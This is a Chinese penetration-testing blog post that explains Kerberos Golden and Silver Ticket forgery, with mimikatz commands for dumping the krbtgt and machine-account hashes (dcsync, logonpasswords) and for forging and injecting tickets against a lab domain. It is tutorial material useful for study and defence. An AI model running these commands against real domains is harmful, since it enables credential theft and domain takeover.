---
title: "Kerberos协议之黄金票据和白银票据"
date: 2020-11-12T11:41:51+08:00
draft: false
tags:
- Kerberos
series:
- Windows协议
categories:
- 渗透测试
---

填坑
<!--more-->

# Golden Ticket
在AS_REQ & AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。

制作金票需要先导出来krbtgt的hash

```
lsadump::dcsync /domain:test.local /user:krbtgt
```

然后需要sid和krbtgt的hash，这里生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash，可以用mimikatz "lsadump::lsa /patch"导出。

```
kerberos::golden /domain:test.local /sid:S-1-5-21-514356739-3204155868-1239341419 /aes256:b4e2924c2d378eda457c2dd3810fdde0a5312354c2b26bc677dfb48e46a17fe7 /user:administrator /ticket:gold.kirbi
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/c37e1d99-39f8-bbbb-2772-8a2c316dff70.png)

然后我们使用这张票据就可以随意在某一台机器上ptt访问dc了。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/684534a7-8081-f24e-5abf-c32e0d0e2af7.png)


# Silver Ticket
白银票据是出现在TGS_REQ & TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。

此处使用dc的cifs服务做演示。首先需要获得如下信息：

1. /domain
2. /sid
3. /target:目标服务器的域名全称，此处为域控的全称
4. /service：目标服务器上面的kerberos服务，此处为cifs
5. /rc4：计算机账户的NTLM hash，域控主机的计算机账户
6. /user：要伪造的用户名，此处可用silver测试

`sekurlsa::logonpasswords`导出服务DC$账户的ntlm hash
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f9a52c2e-438a-3e59-4f29-0ad6c2e5b199.png)

```
kerberos::golden /domain:test.local /sid:S-1-5-21-514356739-3204155868-1239341419 /target:dc.test.local /service:cifs /rc4:9150e40e4ec936a15baf384ca382a3df /user:dc$ /ptt
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/cb1f0cdb-b31f-d08e-cf66-d42405d34902.png)

不仅仅是cifs服务还有其他：
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ae4aa870-4146-f7ff-4003-5b56eb5c4028.png)
ldap可以用来dcsync

# 两者区别
白银票据与黄金票据的不同点

1. 访问权限不同
Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限
Silver Ticket: 伪造 TGS,只能访问指定的服务

2. 加密方式不同
Golden Ticket 由 krbtgt 的 Hash 加密
Silver Ticket 由服务账号(通常为计算机账户)Hash 加密

3. 认证流程不同
Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要

# 参考
1. [域渗透——Pass The Ticket](https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html)
2. https://adsecurity.org/?p=2011
3. http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**